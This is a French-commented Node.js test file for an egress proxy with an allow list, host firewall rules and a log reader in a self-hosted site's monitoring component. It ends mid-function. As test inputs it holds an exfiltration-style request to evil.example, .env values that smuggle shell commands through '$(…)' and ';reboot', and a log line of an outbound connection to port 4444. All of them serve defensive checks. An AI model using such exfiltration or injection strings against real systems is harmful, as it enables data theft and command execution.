import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { execFile, execFileSync, spawnSync } from 'node:child_process';
import { promisify } from 'node:util';
import { VIGIE_KEYS } from './helpers.js';
import { openVigieDb, createStore } from '../vigie/store.js';
import { createDecisions } from '../vigie/decisions.js';
import { createSwitches } from '../vigie/interrupteurs.js';
import { createEngine } from '../vigie/moteur.js';
import { sourceOf } from '../vigie/poids.js';
import { loadVigieConfig } from '../vigie/config.js';
import { run as cli } from '../vigie/cli.js';
import { createReseau, lireLigneHote, lireLigneMandataire, lireSuite, nommeur } from '../vigie/reseau.js';
import { listeAutorisee, autorise, entree, createMandataire, createJournal, estPrivee } from '../deploy/unraid/reseau/mandataire.js';
import { transportOptions, createMailer } from '../server/mailer.js';
import { loadConfig, proxyEnvPrisEnCharge } from '../server/config.js';
import { Eta } from 'eta';
import { fileURLToPath } from 'node:url';
import { vueSante } from '../vigie/console/ecrans/sante-flux.js';

// Vigie, phase E4 (registre des briques, BV-10 et BV-11 ; décisions D24 et D25) : mandataire de sortie à liste autorisée,
// règles de l'hôte (sans les appliquer), source « réseau » de la Vigie (journaux lus en suivant, règles, chaîne DS23,
// silence).
const LOG_KEY = 'cle-de-chaine-vigie-0123456789abcdefgh';
const KEY = 'cle-de-signature-vigie-0123456789abcdef';
const ROOT = path.resolve(new URL('..', import.meta.url).pathname);
const SCRIPT = path.join(ROOT, 'deploy/unraid/reseau/regles.sh');
const execFileP = promisify(execFile);
const tmp = t => { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'vigie-reseau-')); t.after(() => fs.rmSync(d, { recursive: true, force: true })); return d; };

function vigieOf(t, { start = Date.parse('2026-10-20T10:00:00Z') } = {}) {
  const dir = tmp(t);
  const db = openVigieDb(path.join(dir, 'vigie.db'));
  t.after(() => db.close());
  const clock = { t: start };
  const now = () => clock.t;
  const store = createStore({ db, logKey: LOG_KEY, now });
  const decisions = createDecisions({ store, privateKey: VIGIE_KEYS.privateKey, now });
  const switches = createSwitches({ store, now });
  const engine = createEngine({ store, decisions, switches, now });
  store.onAdded(rows => engine.process(rows));
  const site = (type, severity, extra = {}) => store.add([{ id: crypto.randomUUID(), recu_a: now(), survenu_a: now(), type, severity, canal: 'ingestion signée', confiance: 'rapporté',
    composant: 'site · public', ip: '203.0.113.50', ip_net: '203.0.113.0', ...extra, detail: extra.detail ? JSON.stringify(extra.detail) : null }]);
  const alerts = () => db.prepare('SELECT * FROM alerts ORDER BY id').all();
  const events = type => db.prepare('SELECT * FROM events WHERE type = ? ORDER BY seq').all(type).map(e => ({ ...e, detail: JSON.parse(e.detail || 'null') }));
  return { dir, db, store, engine, clock, now, site, alerts, events };
}

// Échantillons réels : lignes JSON du mandataire, lignes du noyau rangées par rsyslog (RSYSLOG_FileFormat ou format
// classique), battement du script des règles.
const ISO = '2026-10-20T10:05:01.123456+00:00';
const L = {
  refus: (hote, t = '2026-10-20T10:05:00.000Z', extra = {}) => JSON.stringify({ t, evt: 'refus', hote, port: 443, raison: 'hors liste', client: '172.29.44.130', ...extra }),
  accepte: (hote, t = '2026-10-20T10:05:00.000Z') => JSON.stringify({ t, evt: 'accepte', hote, port: 443, client: '172.29.44.130', octets_envoyes: 517, octets_recus: 4096, duree_ms: 120 }),
  battement: (t = '2026-10-20T10:05:00.000Z') => JSON.stringify({ t, evt: 'battement', noms: 6, connexions: 0 }),
  sortie: (src = '172.29.42.30', dst = '198.51.100.66', dpt = 4444, ts = ISO) => `${ts} unraid kernel: [123456.789012] NICEPHOS-SORTIE IN=br-6c1f5a2b3c4d OUT=eth0 PHYSIN=veth1a2b3c4 MAC=02:42:ac:1d:2a:1e:02:42:ac:1d:2a:01:08:00 SRC=${src} DST=${dst} LEN=60 TOS=0x00 PREC=0x00 TTL=63 ID=54321 DF PROTO=TCP SPT=40312 DPT=${dpt} WINDOW=64240 RES=0x00 SYN URGP=0 `,
  flux: (src, dst, dpt, ts = ISO) => `${ts} unraid kernel: NICEPHOS-FLUX IN=br-6c1f5a2b3c4d OUT=br-6c1f5a2b3c4d PHYSIN=veth1 PHYSOUT=veth2 MAC=02:42 SRC=${src} DST=${dst} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=1 DF PROTO=TCP SPT=51000 DPT=${dpt} WINDOW=64240 RES=0x00 SYN URGP=0 `,
  battementHote: (etat = 'ok', ts = ISO) => `${ts} unraid nicephos-reseau: NICEPHOS-BATTEMENT etat=${etat} regles=15 attendues=15 version=1`,
};

// ---------------------------------------------------------------------------------------------------------------------
// Mandataire de sortie

test('mandataire : liste autorisée construite depuis le .env du site (OIDC, TSA, SMTP, Instagram, Hugging Face, SORTIE_NOMS)', () => {
  const liste = listeAutorisee({ OIDC_ISSUER: 'https://nicephos-x1.zitadel.cloud', SMTP_URL: 'smtps://a%40gmail.com:secret@smtp.gmail.com:465', INSTAGRAM_APP_ID: '123',
    TRANSLATE_URL: 'http://libretranslate:5000', SORTIE_NOMS: 'api.exemple.org, relais.exemple.org:8443' });
  assert.deepEqual(liste.map(e => e.texte), ['nicephos-x1.zitadel.cloud:443', 'freetsa.org:443', 'smtp.gmail.com:465', 'graph.instagram.com:443', 'api.instagram.com:443',
    'huggingface.co:443', '*.huggingface.co:443', '*.hf.co:443', 'api.exemple.org:443', 'relais.exemple.org:8443']);
  assert.doesNotMatch(JSON.stringify(liste), /secret|a%40gmail/, 'le mot de passe SMTP n’est jamais gardé');
  // TSA désactivée, Hugging Face retiré après le premier téléchargement, smtp:// sur 587 par défaut, traducteur externe.
  const l2 = listeAutorisee({ TSA_URL: 'off', SORTIE_HUGGINGFACE: '0', SMTP_URL: 'smtp://u:p@mail.exemple.org', TRANSLATE_URL: 'https://lt.exemple.org' });
  assert.deepEqual(l2.map(e => e.texte), ['mail.exemple.org:587', 'lt.exemple.org:443']);
  assert.throws(() => listeAutorisee({ SORTIE_NOMS: 'pas un nom' }), /SORTIE_NOMS/);
  assert.equal(entree('1.2.3.4'), null, 'une adresse IP n’est pas un nom');
  assert.ok(autorise(liste, 'cdn-lfs-us-1.hf.co', 443), 'serveurs de fichiers de Hugging Face');
  assert.ok(!autorise(liste, 'hf.co', 443), '*.domaine ne vaut pas le domaine lui-même');
  assert.ok(!autorise(liste, 'evilhf.co', 443));
  assert.ok(!autorise(liste, 'smtp.gmail.com', 443), 'le port compte');
  assert.ok(!autorise(liste, 'freetsa.org.evil.example', 443));
  for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.1.10', '172.29.42.30', '169.254.169.254', '::1', 'fd00::1', '::ffff:192.168.1.1']) assert.ok(estPrivee(ip), ip);
  for (const ip of ['1.1.1.1', '2606:4700::1111']) assert.ok(!estPrivee(ip), ip);
});

// Un mandataire sur 127.0.0.1, une destination « essai.exemple » (écho TCP local) ; résolution simulée.
async function mandataireOf(t, { liste, prive = true, adresses = { 'essai.exemple': ['127.0.0.1'], 'prive.exemple': ['192.168.1.20'] } } = {}) {
  const dir = tmp(t);
  const fichier = path.join(dir, 'mandataire', 'mandataire.log');
  const journal = createJournal({ fichier, max: 4096 });
  const echo = net.createServer(s => s.pipe(s));
  await new Promise(r => echo.listen(0, '127.0.0.1', r));
  const portEcho = echo.address().port;
  const l = liste ?? [entree(`essai.exemple:${portEcho}`), entree(`prive.exemple:${portEcho}`)];
  const m = createMandataire({ liste: l, journal, prive, resolve: async n => { if (!adresses[n]) throw new Error('ENOTFOUND'); return adresses[n]; } });
  await new Promise(r => m.serveur.listen(0, '127.0.0.1', r));
  t.after(async () => { await m.fermer(); echo.close(); journal.fermer(); });
  const lignes = () => fs.readFileSync(fichier, 'utf8').trim().split('\n').filter(Boolean).map(x => JSON.parse(x));
  // Demande brute : renvoie la réponse du mandataire et, après un tunnel, l'écho de « ping ».
  const demande = texte => new Promise((resolve, reject) => {
    const s = net.connect(m.serveur.address().port, '127.0.0.1');
    let recu = '';
    s.on('data', d => { recu += d.toString('latin1'); if (/^HTTP\/1\.1 200/.test(recu) && recu.includes('\r\n\r\n') && !recu.endsWith('ping')) s.write('ping'); if (recu.endsWith('ping')) s.end(); });
    s.on('end', () => resolve(recu)); s.on('close', () => resolve(recu)); s.on('error', reject);
    s.write(texte);
  });
  return { m, fichier, lignes, demande, portEcho, dir };
}

test('mandataire : tunnel vers un nom autorisé ; hors liste, adresse IP, adresse privée, HTTP en clair refusés et journalisés sans chemin', async t => {
  const x = await mandataireOf(t, { prive: false, adresses: { 'essai.exemple': ['198.51.100.10'], 'prive.exemple': ['192.168.1.20'] } });
  // Adresse privée (le nom autorisé mène au réseau local) : refusée, même autorisé.
  assert.match(await x.demande(`CONNECT prive.exemple:${x.portEcho} HTTP/1.1\r\nHost: prive.exemple\r\n\r\n`), /^HTTP\/1\.1 403/);
  assert.match(await x.demande('CONNECT evil.example:443 HTTP/1.1\r\n\r\n'), /^HTTP\/1\.1 403/);
  assert.match(await x.demande('CONNECT 203.0.113.9:443 HTTP/1.1\r\n\r\n'), /^HTTP\/1\.1 403/);
  assert.match(await x.demande('GET http://evil.example/exfiltration?donnees=secret HTTP/1.1\r\nHost: evil.example\r\n\r\n'), /^HTTP\/1\.1 403/);
  assert.match(await x.demande('n’importe quoi\r\n\r\n'), /^HTTP\/1\.1 403/);
  const l = x.lignes();
  assert.deepEqual(l.map(e => [e.evt, e.hote, e.raison]), [['refus', 'prive.exemple', 'adresse privée'], ['refus', 'evil.example', 'hors liste'],
    ['refus', '203.0.113.9', 'adresse ip sans nom'], ['refus', 'evil.example', 'http en clair'], ['refus', null, 'demande illisible']]);
  assert.doesNotMatch(fs.readFileSync(x.fichier, 'utf8'), /exfiltration|secret|donnees/, 'jamais de chemin ni de contenu');
  assert.equal(l[0].client, '127.0.0.1');
});

test('mandataire : tunnel établi, octets comptés ; journal borné (renommé en .1)', async t => {
  const x = await mandataireOf(t, { adresses: { 'essai.exemple': ['127.0.0.1'], 'prive.exemple': [] } });
  // Nom permis mais introuvable : 502, noté « echec » (pas un refus : la Vigie ne le signale pas).
  assert.match(await x.demande(`CONNECT prive.exemple:${x.portEcho} HTTP/1.1\r\n\r\n`), /^HTTP\/1\.1 502/);
  assert.deepEqual([x.lignes().at(-1).evt, x.lignes().at(-1).raison], ['echec', 'nom introuvable']);
  const r = await x.demande(`CONNECT essai.exemple:${x.portEcho} HTTP/1.1\r\nHost: essai.exemple\r\n\r\n`);
  assert.match(r, /^HTTP\/1\.1 200 Connection Established\r\n\r\nping$/);
  await new Promise(res => setTimeout(res, 50));
  const ok = x.lignes().find(e => e.evt === 'accepte');
  assert.equal(ok.hote, 'essai.exemple');
  assert.equal(ok.octets_envoyes, 4);
  assert.equal(ok.octets_recus, 4);
  // 4 Ko au plus (réglé ainsi pour l'essai) : le journal est renommé en .1 et repart.
  for (let i = 0; i < 40; i++) await x.demande(`CONNECT n${i}.evil.example:443 HTTP/1.1\r\n\r\n`);
  assert.ok(fs.existsSync(`${x.fichier}.1`));
  assert.ok(fs.statSync(x.fichier).size <= 4096);
});

test('mandataire : fetch de Node 22 (NODE_USE_ENV_PROXY=1) et nodemailer passent par lui', async t => {
  const x = await mandataireOf(t);
  const proxy = `http://127.0.0.1:${x.m.serveur.address().port}`;
  // fetch : un nom hors liste est demandé au mandataire (CONNECT), qui le refuse ; NO_PROXY : direct.
  // Processus à part, lancé sans bloquer : le mandataire tourne dans ce processus-ci.
  const r = await execFileP(process.execPath, ['-e', "fetch('https://hors-liste.exemple/chemin-secret').then(()=>console.log('passé')).catch(e=>console.log('refusé', e.cause?.message||e.message))"],
    { env: { ...process.env, NODE_USE_ENV_PROXY: '1', HTTPS_PROXY: proxy, NO_PROXY: 'localhost,127.0.0.1' }, encoding: 'utf8', timeout: 20000 });
  assert.match(r.stdout, /refusé/);
  assert.equal(x.lignes().at(-1).hote, 'hors-liste.exemple');
  assert.doesNotMatch(fs.readFileSync(x.fichier, 'utf8'), /chemin-secret/);
  // nodemailer : option « proxy » posée seulement si le site sort par le mandataire, jamais vers un relais local.
  assert.equal(transportOptions('smtps://u:p@smtp.exemple.org:465', { proxy }).proxy, proxy);
  assert.equal(transportOptions('smtps://u:p@smtp.exemple.org:465').proxy, undefined);
  assert.equal(transportOptions('smtp://localhost:1025', { proxy }).proxy, undefined);
  const mailer = createMailer({ url: 'smtps://u:motdepasse@smtp.hors-liste.exemple:465', from: 'Nicephos <a@exemple.org>', proxy });
  await assert.rejects(mailer.send({ to: 'b@exemple.org', subject: 'essai', text: 'essai' }));
  assert.deepEqual([x.lignes().at(-1).hote, x.lignes().at(-1).port], ['smtp.hors-liste.exemple', 465], 'nodemailer demande le mandataire (CONNECT)');
  assert.doesNotMatch(fs.readFileSync(x.fichier, 'utf8'), /motdepasse/);
  // Configuration du site : sans NODE_USE_ENV_PROXY, rien ne change ; avec, un mandataire http://nom:port est exigé.
  const dir = tmp(t);
  const base = { STORAGE_DIR: dir, DATABASE_PATH: path.join(dir, 'site.db'), SITE_NAME: 'Test', TSA_URL: 'off' };
  assert.equal(loadConfig(base).mail.proxy, null);
  assert.equal(loadConfig({ ...base, HTTPS_PROXY: '' , NODE_USE_ENV_PROXY: '' }).mail.proxy, null, 'variables vides posées par la pile sans le profil');
  assert.equal(loadConfig({ ...base, NODE_USE_ENV_PROXY: '1', HTTPS_PROXY: 'http://sortie:3128' }).mail.proxy, 'http://sortie:3128');
  assert.throws(() => loadConfig({ ...base, NODE_USE_ENV_PROXY: '1' }), /HTTPS_PROXY/);
  assert.throws(() => loadConfig({ ...base, NODE_USE_ENV_PROXY: '1', HTTPS_PROXY: 'http://u:p@sortie:3128' }), /HTTPS_PROXY/);
  assert.equal(proxyEnvPrisEnCharge('22.20.0'), false);
  assert.equal(proxyEnvPrisEnCharge('22.21.0'), true);
});

test('pile Unraid : mandataire facultatif (profil « sortie »), site inchangé sans lui, journaux en lecture seule dans la Vigie', () => {
  const y = fs.readFileSync(path.join(ROOT, 'deploy/unraid/compose.yaml'), 'utf8');
  const service = name => new RegExp(`\\n  ${name}:\\n([\\s\\S]*?)(?=\\n  [a-z-]+:\\n|\\nvolumes:)`).exec(y)[1];
  const sortie = service('sortie');
  assert.match(sortie, /profiles: \[sortie\]/);
  assert.match(sortie, /command: \["node", "reseau\/mandataire\.js"\]/);
  assert.match(sortie, /<<: \*hardening/);
  assert.doesNotMatch(sortie, /env_file|ports:|COOKIE_SECRET|DATA_KEY|OIDC_CLIENT_SECRET/, 'ni le .env entier, ni port publié, ni secret du site');
  assert.match(sortie, /ipv4_address: \$\{SORTIE_IP:-172\.29\.44\.10\}/);
  // Site : variables vides sans SORTIE_MANDATAIRE (rien ne change), adresse fixe connue des règles de l'hôte.
  const site = service('site');
  assert.match(site, /HTTPS_PROXY: \$\{SORTIE_MANDATAIRE:-\}/);
  assert.match(site, /NODE_USE_ENV_PROXY: \$\{SORTIE_MANDATAIRE:\+1\}/);
  assert.match(site, /NO_PROXY: \$\{SORTIE_MANDATAIRE:\+localhost,127\.0\.0\.1,::1,vigie-reception,libretranslate\}/);
  assert.match(site, /ipv4_address: \$\{SITE_IP:-172\.29\.42\.30\}/);
  assert.match(service('libretranslate'), /ipv4_address: \$\{TRADUCTION_IP:-172\.29\.42\.40\}/);
  assert.match(y, /\n {2}sortie-interne:\n {4}name: nicephos-sortie\n {4}internal: true\n/);
  // Vigie : le dossier des journaux réseau, en lecture seule.
  assert.match(service('vigie'), /target: \/reseau\n {8}read_only: true/);
  // Image du site : le mandataire y est.
  assert.match(fs.readFileSync(path.join(ROOT, 'Dockerfile'), 'utf8'), /COPY deploy\/unraid\/reseau\/mandataire\.js \.\/reseau\/mandataire\.js/);
});

// ---------------------------------------------------------------------------------------------------------------------
// Règles de l'hôte (jamais appliquées ici)

const script = (args, { env = {}, input } = {}) => spawnSync('bash', [SCRIPT, ...args], { env: { PATH: process.env.PATH, ...env }, encoding: 'utf8', input });

test('règles de l’hôte : --afficher imprime la matrice BV-11 et les sorties BV-10, identique d’une fois sur l’autre', t => {
  const dir = tmp(t);
  const envFile = path.join(dir, '.env');
  // Le .env n'est jamais exécuté : une ligne piégée ne fait rien, seules les clés attendues sont lues.
  fs.writeFileSync(envFile, `NICEPHOS_DIR=/mnt/cache/appdata/nicephos\nCOOKIE_SECRET="$(touch ${dir}/piege)"\nSITE_IP=172.29.42.30 # site\nOIDC_ISSUER=https://x.zitadel.cloud\n`);
  const a = script(['--afficher', '--env', envFile]);
  assert.equal(a.status, 0, a.stderr);
  assert.ok(!fs.existsSync(path.join(dir, 'piege')));
  const regles = a.stdout.split('\n').filter(l => l.startsWith('-A '));
  for (const attendue of [
    '-A NICEPHOS -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN',
    '-A NICEPHOS -s 172.29.42.10/32 -d 172.29.42.30/32 -p tcp -m tcp --dport 3000 -j RETURN',       // tunnel → site
    '-A NICEPHOS -s 172.29.42.10/32 -d 172.29.42.20/32 -p tcp -m tcp --dport 4200 -j RETURN',       // tunnel → console
    '-A NICEPHOS -s 172.29.43.0/24 -d 172.29.43.10/32 -p tcp -m tcp --dport 4100 -j RETURN',        // site → réception
    '-A NICEPHOS -s 172.29.42.30/32 -d 172.29.42.40/32 -p tcp -m tcp --dport 5000 -j RETURN',       // site → traducteur
    '-A NICEPHOS -s 172.29.44.0/24 -d 172.29.44.10/32 -p tcp -m tcp --dport 3128 -j RETURN',        // site → mandataire
    '-A NICEPHOS -s 172.29.42.10/32 -j RETURN', '-A NICEPHOS -s 172.29.42.20/32 -j RETURN', '-A NICEPHOS -s 172.29.42.40/32 -j RETURN',
    '-A NICEPHOS -s 172.29.42.0/24 -j NICEPHOS-SORTIE',
    '-A NICEPHOS-VERS -s 172.29.42.0/24 -j NICEPHOS-FLUX',
    '-A NICEPHOS-FLUX -m limit --limit 20/min --limit-burst 40 -j LOG --log-prefix "NICEPHOS-FLUX " --log-level 4',
    '-A NICEPHOS-SORTIE -m limit --limit 20/min --limit-burst 40 -j LOG --log-prefix "NICEPHOS-SORTIE " --log-level 4',
    '-A NICEPHOS-SORTIE -j REJECT --reject-with icmp-port-unreachable',
  ]) assert.ok(regles.includes(attendue), attendue);
  // Ordre : réponses d'abord, flux voulus avant les rejets entre conteneurs, rejets entre conteneurs avant les sorties.
  const i = s => regles.findIndex(l => l.startsWith(s));
  assert.ok(i('-A NICEPHOS -m conntrack') === 0);
  assert.ok(i('-A NICEPHOS -s 172.29.44.0/24 -d 172.29.44.10/32') < i('-A NICEPHOS -d 172.29.42.0/24 -j NICEPHOS-VERS'));
  assert.ok(i('-A NICEPHOS -d 172.29.44.0/24 -j NICEPHOS-VERS') < i('-A NICEPHOS -s 172.29.42.10/32 -j RETURN'));
  assert.ok(i('-A NICEPHOS -s 172.29.42.40/32 -j RETURN') < i('-A NICEPHOS -s 172.29.42.0/24 -j NICEPHOS-SORTIE'));
  assert.ok(!regles.some(l => /-s 172\.29\.42\.30\/32 -j RETURN/.test(l)), 'le site ne sort jamais en direct');
  assert.ok(!regles.some(l => /DOCKER-USER/.test(l)), 'la chaîne de Docker n’est jamais remise à zéro');
  assert.match(a.stdout, /^\*filter\n:NICEPHOS - \[0:0\]\n/m);
  assert.match(a.stdout, /^COMMIT$/m);
  assert.match(a.stdout, /iptables -I DOCKER-USER 1 -j NICEPHOS/);
  assert.match(a.stdout, /file="\/mnt\/cache\/appdata\/nicephos\/reseau\/hote\/hote\.log"/);
  assert.match(a.stdout, /\$inputname == "imklog" and \$msg contains "NICEPHOS-"/, 'rsyslog : seulement le noyau et le script de cette machine');
  // Idempotence logique : relancé, il imprime exactement la même chose (chaînes remises à zéro puis remplies d'un coup).
  assert.equal(script(['--afficher', '--env', envFile]).stdout, a.stdout);
  // Réglages du .env pris en compte ; valeur douteuse refusée.
  fs.writeFileSync(envFile, 'NET_SUBNET=10.20.0.0/24\nTUNNEL_IP=10.20.0.10\n');
  assert.match(script(['--afficher', '--env', envFile]).stdout, /-A NICEPHOS -s 10\.20\.0\.10\/32 -d 172\.29\.42\.30\/32 -p tcp -m tcp --dport 3000 -j RETURN/);
  for (const bad of ['SITE_IP=1.2.3.4;reboot', 'NET_SUBNET=0.0.0.0/0', 'TUNNEL_IP=999.1.1.1', 'NICEPHOS_DIR=/mnt/$(x)']) {
    fs.writeFileSync(envFile, `${bad}\n`);
    const r = script(['--afficher', '--env', envFile]);
    assert.equal(r.status, 2, bad);
    assert.match(r.stderr, /invalide/, bad);
  }
  assert.equal(script(['--inconnue']).status, 2);
});

test('règles de l’hôte : appliquer deux fois ne double rien ; battement ; retirer (iptables simulé)', t => {
  const dir = tmp(t);
  const etat = path.join(dir, 'etat');
  fs.mkdirSync(etat);
  // Faux iptables : DOCKER-USER et les chaînes de Nicephos dans des fichiers ; iptables-restore remplace les chaînes
  // déclarées ; logger écrit dans un fichier.
  const bin = path.join(dir, 'bin');
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(etat, 'DOCKER-USER'), '-A DOCKER-USER -j RETURN\n');
  fs.writeFileSync(path.join(bin, 'iptables'), `#!/bin/bash
E=${etat}
case "$1" in
  -S) [ -f "$E/$2" ] && cat "$E/$2" || exit 1 ;;
  -C) grep -qxF -- "-A $2 \${*:3}" "$E/$2" ;;
  -I) { echo "-A $2 \${*:4}"; cat "$E/$2"; } > "$E/t" && mv "$E/t" "$E/$2" ;;
  -D) n=$(grep -nxF -- "-A $2 \${*:3}" "$E/$2" | head -1 | cut -d: -f1); [ -n "$n" ] && sed -i "\${n}d" "$E/$2" ;;
  -F) [ -f "$E/$2" ] && : > "$E/$2" || exit 1 ;;
  -X) [ -f "$E/$2" ] && rm "$E/$2" || exit 1 ;;
esac
`);
  fs.writeFileSync(path.join(bin, 'iptables-restore'), `#!/bin/bash
E=${etat}
[ "$1" = "--noflush" ] || exit 9
while IFS= read -r l; do
  case "$l" in :*) c=\${l#:}; c=\${c%% *}; : > "$E/$c" ;; -A\\ *) c=\${l#-A }; c=\${c%% *}; echo "$l" >> "$E/$c" ;; esac
done
`);
  fs.writeFileSync(path.join(bin, 'logger'), `#!/bin/bash\necho "$@" >> ${dir}/syslog\n`);
  for (const f of ['iptables', 'iptables-restore', 'logger']) fs.chmodSync(path.join(bin, f), 0o755);
  const env = { PATH: `${bin}:${process.env.PATH}` };
  const envFile = path.join(dir, '.env');
  fs.writeFileSync(envFile, '');
  const docker = () => fs.readFileSync(path.join(etat, 'DOCKER-USER'), 'utf8');
  for (let k = 0; k < 2; k++) assert.equal(script(['--env', envFile], { env }).status, 0);
  assert.equal(docker(), '-A DOCKER-USER -j NICEPHOS\n-A DOCKER-USER -j RETURN\n', 'un seul appel, en tête');
  assert.equal(fs.readFileSync(path.join(etat, 'NICEPHOS'), 'utf8').split('\n').filter(Boolean).length, 15, 'chaîne remplie une fois');
  assert.equal(script(['--battement', '--env', envFile], { env }).status, 0);
  assert.match(fs.readFileSync(path.join(dir, 'syslog'), 'utf8'), /-t nicephos-reseau NICEPHOS-BATTEMENT etat=ok regles=15 attendues=15 version=1/);
  // Une règle retirée à la main : « incompletes » ; l'appel retiré : « absentes ».
  execFileSync('sed', ['-i', '$d', path.join(etat, 'NICEPHOS')]);
  script(['--battement', '--env', envFile], { env });
  assert.match(fs.readFileSync(path.join(dir, 'syslog'), 'utf8'), /etat=incompletes regles=14/);
  assert.equal(script(['--retirer', '--env', envFile], { env }).status, 0);
  assert.equal(docker(), '-A DOCKER-USER -j RETURN\n', 'retiré ; le reste de DOCKER-USER intact');
  assert.ok(!fs.existsSync(path.join(etat, 'NICEPHOS')) && !fs.existsSync(path.join(etat, 'NICEPHOS-FLUX')));
  script(['--battement', '--env', envFile], { env });
  assert.match(fs.readFileSync(path.join(dir, 'syslog'), 'utf8'), /etat=absentes/);
  // Sans DOCKER-USER (Docker arrêté) : refus clair.
  fs.rmSync(path.join(etat, 'DOCKER-USER'));
  const r = script(['--env', envFile], { env });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /DOCKER-USER absente/);
});

// ---------------------------------------------------------------------------------------------------------------------
// Lecture des journaux

test('lecture : lignes du mandataire et de l’hôte (formats réels), valeurs revérifiées', () => {
  const now = Date.parse('2026-10-20T12:00:00Z');
  assert.deepEqual(lireLigneHote(L.sortie(), { now }), { t: Date.parse(ISO), nature: 'sortie', src: '172.29.42.30', dst: '198.51.100.66', proto: 'tcp', dpt: 4444, entree: 'br-6c1f5a2b3c4d', sortie: 'eth0' });
  // Format classique de rsyslog (sans année) : année courante, jamais dans le futur.
  assert.equal(lireLigneHote('Oct 20 10:05:01 unraid kernel: NICEPHOS-FLUX IN=br-a OUT=br-a SRC=172.29.42.30 DST=172.29.42.20 PROTO=TCP SPT=1 DPT=4200', { now }).t, Date.parse('2026-10-20T10:05:01Z'));
  assert.equal(lireLigneHote('Dec 31 23:59:59 unraid kernel: NICEPHOS-FLUX SRC=172.29.42.30 DST=172.29.42.20 PROTO=UDP DPT=53', { now: Date.parse('2027-01-01T00:10:00Z') }).t, Date.parse('2026-12-31T23:59:59Z'));
  assert.equal(lireLigneHote('Oct 20 10:05:01 unraid kernel: NICEPHOS-FLUX SRC=172.29.42.30 DST=172.29.42.20 PROTO=ICMP TYPE=8', { now }).dpt, null, 'ICMP : pas de port');
  assert.deepEqual(lireLigneHote(L.battementHote('absentes'), { now }), { t: Date.parse(ISO), nature: 'battement', etat: 'absentes', regles: 15, attendues: 15 });
  for (const bad of ['', 'Oct 20 kernel: rien à voir', `${ISO} unraid kernel: NICEPHOS-SORTIE SRC=x DST=1.2.3.4`, `${ISO} unraid kernel: NICEPHOS-AUTRE SRC=1.1.1.1 DST=1.2.3.4`]) assert.equal(lireLigneHote(bad, { now }), null, bad);
  assert.equal(lireLigneHote(`${ISO} x kernel: NICEPHOS-SORTIE IN=<script> OUT=eth0 SRC=172.29.42.30 DST=1.2.3.4 PROTO=TCP DPT=99999`, { now }).dpt, null);
  assert.equal(lireLigneHote(`${ISO} x kernel: NICEPHOS-SORTIE IN=<script> OUT=eth0 SRC=172.29.42.30 DST=1.2.3.4 PROTO=TCP DPT=443`, { now }).entree, null);
  assert.deepEqual(lireLigneMandataire(L.refus('evil.example'), { now }), { t: Date.parse('2026-10-20T10:05:00.000Z'), evt: 'refus', hote: 'evil.example', port: 443, raison: 'hors liste', client: '172.29.44.130', octets_envoyes: null, octets_recus: null, noms: null });
  for (const bad of ['{', '[]', '{"evt":"autre"}', 'null', 'texte']) assert.equal(lireLigneMandataire(bad, { now }), null, bad);
  const x = lireLigneMandataire(JSON.stringify({ evt: 'refus', hote: 'a‮b\nc', port: 70000, client: 'pas-une-ip', raison: 'x'.repeat(500) }), { now });
  assert.equal(x.t, now);
  assert.equal(x.port, null);
  assert.equal(x.client, null);
  assert.doesNotMatch(x.hote, /[‮\n]/);
  assert.equal(x.raison.length, 80);
  const nom = nommeur();
  assert.deepEqual(['172.29.42.30', '172.29.43.131', '172.29.43.10', '172.29.44.10', '172.29.42.200', '8.8.8.8'].map(nom), ['site', 'site', 'vigie-reception', 'sortie', 'pile', null]);
  assert.throws(() => nommeur('site=1.2.3'), /VIGIE_RESEAU_NOMS/);
});

test('lecture en suivant : ligne incomplète attendue, rotation (fin du .1 lue), troncature, ligne démesurée, retard sauté', t => {
  const dir = tmp(t);
  const f = path.join(dir, 'j.log');
  fs.writeFileSync(f, 'un\ndeux\ntro');
  let r = lireSuite(f, null);
  assert.deepEqual(r.lignes, ['un', 'deux']);
  fs.appendFileSync(f, 'is\nquatre\n');
  r = lireSuite(f, r.position);
  assert.deepEqual(r.lignes, ['trois', 'quatre']);
  // Rotation : renommé en .1 (avec une ligne écrite juste avant), nouveau fichier.
  fs.appendFileSync(f, 'cinq\n');
  fs.renameSync(f, `${f}.1`);
  fs.writeFileSync(f, 'six\n');
  r = lireSuite(f, r.position);
  assert.ok(r.rotation);
  assert.deepEqual(r.lignes, ['cinq', 'six']);
  // Troncature (copytruncate) : relu depuis le début.
  fs.writeFileSync(f, 'sept\n');
  r = lireSuite(f, { ...r.position, pos: 999 });
  assert.ok(r.troncature);
  assert.deepEqual(r.lignes, ['sept']);
  // Ligne de plus de 8 Ko : ignorée, la suivante lue.
  fs.appendFileSync(f, `${'x'.repeat(9000)}\nhuit\n`);
  r = lireSuite(f, r.position);
  assert.deepEqual(r.lignes, ['huit']);
  // Lecture bornée à 1 Mo par passage (ici 64 octets) ; premier passage sur un gros fichier : la fin seulement, sans
  // morceau de ligne ; au-delà du retard permis, le milieu est sauté et compté.
  const g = path.join(dir, 'g.log');
  fs.writeFileSync(g, Array.from({ length: 100 }, (_, i) => `ligne-${String(i).padStart(3, '0')}`).join('\n') + '\n');
  r = lireSuite(g, null, { max: 64 });
  assert.ok(r.lignes.length >= 4 && r.lignes.every(l => /^ligne-\d{3}$/.test(l)) && r.lignes.at(-1) === 'ligne-099');
  r = lireSuite(g, { ino: fs.statSync(g).ino, pos: 0 }, { max: 64, retard: 200 });
  assert.ok(r.saute > 0);
  assert.equal(r.lignes.at(-1), 'ligne-099');
  r = lireSuite(g, { ino: fs.statSync(g).ino, pos: 0 }, { max: 64 });
  assert.deepEqual(r.lignes.slice(0, 2), ['ligne-000', 'ligne-001']);
  assert.ok(r.position.pos <= 64, 'pas plus que le budget');
  // Pas un fichier ordinaire, ou absent.
  assert.equal(lireSuite(dir, null).erreur, 'pas un fichier ordinaire');
  assert.ok(lireSuite(path.join(dir, 'absent'), null).absent);
});

// ---------------------------------------------------------------------------------------------------------------------
// Événements, règles, chaîne DS23, silence

function reseauOf(t, v) {
  const fichiers = { mandataire: path.join(v.dir, 'mandataire.log'), hote: path.join(v.dir, 'hote.log') };
  fs.writeFileSync(fichiers.mandataire, '');
